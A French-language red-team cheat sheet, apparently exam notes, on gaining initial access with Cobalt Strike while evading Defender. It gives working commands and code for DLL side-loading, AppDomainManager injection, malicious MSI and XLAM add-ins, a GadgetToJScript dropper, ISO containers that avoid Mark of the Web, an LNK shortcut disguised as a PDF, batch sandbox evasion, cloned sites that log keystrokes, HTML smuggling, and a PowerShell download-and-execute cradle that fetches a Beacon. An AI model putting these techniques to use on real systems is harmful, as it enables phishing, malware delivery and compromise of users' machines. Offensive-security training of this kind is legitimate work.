# Initial Access — Accès initial

> Scénario d'examen **assume-breach** : une machine foothold et des credentials sont fournis. Aucun Beacon n'est déjà actif. Il faut préparer le premier Beacon en tenant compte des protections endpoint, avec Defender activé.

**Structure :** `DELIVERY → CONTAINER → TRIGGER → PAYLOAD → DECOY`

---

## Vérifications préalables — Defender

Avant tout dépôt ou exécution de payload sur disque, les éléments suivants doivent être vérifiés :

```
[ ] Artifact Kit built and ThreatCheck clean (Defender engine)
[ ] Resource Kit built and ThreatCheck clean (AMSI engine)
[ ] Malleable C2 profile: stage + post-ex + process-inject blocks loaded
[ ] artifact.cna + resources.cna loaded in CS Script Manager
```

Consulter `cheatsheets/defense-evasion.md` pour le workflow de préparation complet.

---

## Payloads

### DLL Side-Loading

Faire charger une DLL par une application légitime en exploitant l'ordre de recherche des DLL sous Windows.

**Rechercher les possibilités avec un filtre ProcMon :**
```
Path ends with .dll  AND  Result = NAME NOT FOUND
```

**WinSxS — anciennes versions d'applications encore présentes après un patch :**
```
C:\Windows\WinSxS\
```

L'emplacement le plus simple dans ce scénario est le **current working directory (CWD)** : placer la DLL sous le nom attendu et lancer l'application.

```cmd
# Find ngentask.exe in WinSxS (older version with DLL search order vuln)
dir /s /b C:\Windows\WinSxS\*ngentask.exe

# Drop DLL into CWD and execute
copy C:\Payloads\mscorsvc.dll .
ngentask.exe
```

### AppDomainManager Injection — Applications .NET Framework

Cette technique utilise des variables d'environnement ou un fichier `.config` pour faire charger une DLL personnalisée à une application .NET Framework.

**Méthode 1 — Variables d'environnement :**

```cmd
set APPDOMAIN_MANAGER_ASM=MyManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyManager.MyDomainManager
ngentask.exe
```

**Méthode 2 — Fichier de configuration** (nom correspondant à l'application : `ngentask.exe.config`) :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="MyManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="MyManager.MyDomainManager" />
  </runtime>
</configuration>
```

La DLL doit se trouver dans le dossier de l'application .NET cible. Les notes suggèrent de copier une assembly disponible (par exemple `ngentask.exe`) dans le CWD comme déclencheur.

### Windows Installer (MSI)

Les packages MSI peuvent déclencher l'exécution d'un payload pendant l'installation.

```
VS → New Project → Setup Project
→ Add File: payload exe to Application Folder
→ View → Custom Actions → Install → Add Custom Action → select payload
→ Set "Run 64 Bit" = True on the action
→ Build → produces .exe wrapper + .msi (deliver .msi only)
```

> L'installation MSI utilise les permissions utilisateur sauf si une élévation UAC est acceptée. Un wrapper `.exe` n'est pas nécessaire : seul le `.msi` est utilisé dans cet exemple.

### Excel Add-In (XLAM)

Les fichiers XLAM dans `%APPDATA%\Microsoft\Excel\XLSTART\` peuvent se charger automatiquement à l'ouverture d'Excel, cet emplacement étant considéré comme trusted dans le scénario décrit.

```
Alt+F11 → Insert Module → add macro code
File → Save As → Excel Add-In (*.xlam) → save to C:\Payloads\
```

**Delivery :** copier le fichier dans XLSTART (accessible en écriture à un utilisateur standard) :
```cmd
copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\payload.xlam"
# Executes automatically on next Excel launch — no user interaction needed
```

### Dropper — GadgetToJScript (.NET DLL vers JS/VBS/HTA)

Intègre un payload dans une DLL .NET, puis le sérialise vers JavaScript. Chaîne : `JS → .NET DLL → EXE/DLL`.

```
VS → New .NET Framework Class Library → add payload as Embedded Resource
→ GetManifestResourceStream → write to C:\ProgramData\<dir>\payload.exe → Process.Start
→ Build → MyDropper.dll
```

```bash
# Serialise to JS dropper
GadgetToJScript.exe -a MyDropper.dll -w js -b -o dropper
# -w: js / vbs / vba / hta
# -b: bypass .NET 4.8+ type check controls
```

Exécution : double-cliquer sur `dropper.js` (handler wscript par défaut) ou utiliser `wscript dropper.js`.

> **Chemins de dépôt indiqués comme moins suspects dans ces notes** (accessibles en écriture) : `C:\ProgramData\<subdir>\`
> Éviter le dossier utilisateur et `%TEMP%`, susceptibles d'être détectés par des règles comportementales.

---

## Containers — Gestion du Mark of the Web (MotW)

Le MotW limite l'exécution des macros Office et peut déclencher des alertes SmartScreen. D'après ces notes, les containers ISO/IMG ne transmettent pas le MotW à leur contenu.

```bash
# PackMyPayload — pack into ISO stripping MotW
python3 PackMyPayload.py trigger.lnk payload.dll decoy.pdf output.iso

# Hide payload and decoy, show only trigger
python3 PackMyPayload.py -H payload.dll -H decoy.pdf trigger.lnk output.img
```

**Comparaison des formats de container :**

| Format | Propagation MotW | Support natif Windows |
|--------|-----------------|----------------------|
| ISO | Non | Oui (auto-mount) |
| IMG | Non | Oui (auto-mount) |
| ZIP | Oui | Oui |
| WIM | Non | Oui |
| 7z / RAR | Oui | Non (outil tiers requis) |

---

## Triggers

### Shell Link (LNK) — Raccourcis Windows

Dans les conditions décrites, l'extension `.lnk` peut être masquée dans Explorer, même avec l'affichage des extensions. L'icône est personnalisable et `report.pdf.lnk` peut apparaître comme `report.pdf`.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\report.pdf.lnk")
$lnk.TargetPath     = "C:\Windows\System32\cmd.exe"
$lnk.Arguments      = "/c rundll32.exe C:\ProgramData\update\beacon.dll,StartW"
$lnk.IconLocation   = "C:\Windows\System32\shell32.dll,222"   # PDF icon
$lnk.WindowStyle    = 7   # Minimised — no visible window
$lnk.Save()
```

Pour la delivery d'un XLAM via LNK :
```powershell
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments  = '/c copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\" & start "" decoy.xlsx'
```

### Fichier Batch (BAT/CMD)

```batch
@echo off
REM Sandbox evasion — exit if not double-clicked
echo %cmdcmdline% | findstr /i "%~0" > nul
if errorlevel 1 exit

REM Payload execution
start "" /min C:\ProgramData\update\payload.exe
REM Open decoy
start "" decoy.pdf
```

### MSC — Grim Resource et mmc.exe

`mmc.exe` peut effectuer une élévation selon le contexte UAC. Le fichier MSC du scénario intègre du VBScript au moyen d'une faille XSS.

```
1. Take example MSC template (GrimResource / MSC_Dropper)
2. Craft payload (URL-encoded VBScript on line 105):
   CreateObject("WScript.Shell").Run "cmd.exe /c <command>",0
3. URL-encode via CyberChef → paste into line 105
4. Deliver MSC file — double-click triggers mmc.exe → executes payload
```

---

## Delivery

### Cobalt Strike — Host File et Site Clone

**Étape 1 — Héberger le payload :**
```
CS → Site Management → Host File
  File:      payload.iso (or .exe, .dll)
  Local URI: /windows-update.iso
  Local Host: <teamserver IP or lookalike domain>
  Port:       80 / 443
```

**Étape 2 — Cloner le site et intégrer le téléchargement :**
```
CS → Site Management → Clone Site
  Clone URL:  https://legitimate-site.com/download
  Local URI:  /download
  Local Host: <lookalike domain>
  Attack:     select hosted file from step 1
  Log keystrokes: Yes (if cloned page has login form)
```

Le visiteur ouvre l'URL clonée ; une iframe cachée provoque le téléchargement automatique du payload dans cet exemple.

### HTML Smuggling

Encode le payload en Base64 dans du HTML plutôt que de transférer un flux `application/octet-stream` ; le trafic possède un profil différent face aux contrôles de contenu.

```html
<script>
  var fileContent = "<BASE64_ENCODED_PAYLOAD>";
  var fileName    = "windows-update.iso";

  function downloadFile() {
    var blob = new Blob([Uint8Array.from(atob(fileContent), c => c.charCodeAt(0))],
                        {type: 'application/octet-stream'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
  }
</script>
<button onclick="downloadFile()">View Document</button>
```

> Les notes évoquent l'utilisation de Web Crypto API (AES) et de l'obfuscation JavaScript pour modifier le profil du contenu vis-à-vis des passerelles.

### SVG Smuggling

Même principe que HTML Smuggling au format `.svg`, avec déclenchement si Edge est le handler SVG par défaut.

---

## Cobalt Strike Scripted Web Delivery — Premier Beacon

```
CS → Attacks → Scripted Web Delivery
  Listener: http
  Type: PowerShell
  Launch → copy URL
```

Sur la machine foothold (PowerShell) :
```powershell
iex (new-object net.webclient).downloadstring('http://<teamserver>/payload_url')
```

> Nécessite le chargement préalable de l'Artifact Kit et du Resource Kit ainsi qu'un profile actif ; sinon, Defender peut bloquer l'exécution.

---

## Code Signing — Contexte

| Type de certificat | Effet SmartScreen | Obtention |
|-----------------|-------------------|--------------|
| Standard | Signé, mais « Unknown Publisher » peut rester affiché | Achat DigiCert / GlobalSign |
| EV (Extended Validation) | Considéré comme plus fiable dans ces notes | Vérifications d'entreprise requises |

> Pour l'examen, la signature de code n'est pas exigée selon ces notes. Elles recommandent de ne pas associer l'identité réelle à un certificat utilisé pour signer un payload qui pourrait être soumis à VirusTotal.

---

## Récapitulatif OPSEC — Initial Access

| Technique | OPSEC | Remarques |
|-----------|-------|-------|
| Container ISO + trigger LNK | SAFE | MotW non transmis selon les notes ; pas d'exécution directe depuis un chemin non fiable |
| AppDomainManager Injection | SAFE | Exécution dans un processus .NET légitime, sans child cmd.exe |
| DLL Side-Loading via WinSxS | SAFE | Chargement DLL par un processus légitime |
| Auto-load XLAM via XLSTART | SAFE | Exécution dans Excel, sans parent inhabituel |
| Dropper JS GadgetToJScript | CAUTION | Lancement de wscript.exe ; surveiller la chaîne parent–child |
| Installation MSI | CAUTION | Processus installer visible, écrit sur disque |
| Scripted Web Delivery (PS) | CAUTION | Téléchargement IEX ; AMSI s'applique et le Resource Kit doit être préparé |
| Trigger BAT/CMD | UNSAFE | cmd.exe visible dans l'arbre des processus EDR |

---

## Référence rapide

```
FIRST BEACON:    CS → Attacks → Scripted Web Delivery → iex downloadstring
HOST FILE:       CS → Site Management → Host File → URI + port
CONTAINER:       python3 PackMyPayload.py [-H hidden] files... output.iso
LNK TRIGGER:     $wsh = New-Object -ComObject WScript.Shell → CreateShortcut
XLAM PERSIST:    copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\"
DLL SIDELOAD:    procmon filter: Path ends .dll + Result NAME NOT FOUND → drop DLL in CWD
APPDOMAIN:       set APPDOMAIN_MANAGER_ASM=... + APPDOMAIN_MANAGER_TYPE=... → run .NET app
DROPPER:         GadgetToJScript.exe -a MyDropper.dll -w js -b -o dropper
HTML SMUGGLING:  base64 payload in JS blob → auto-download on page load
```
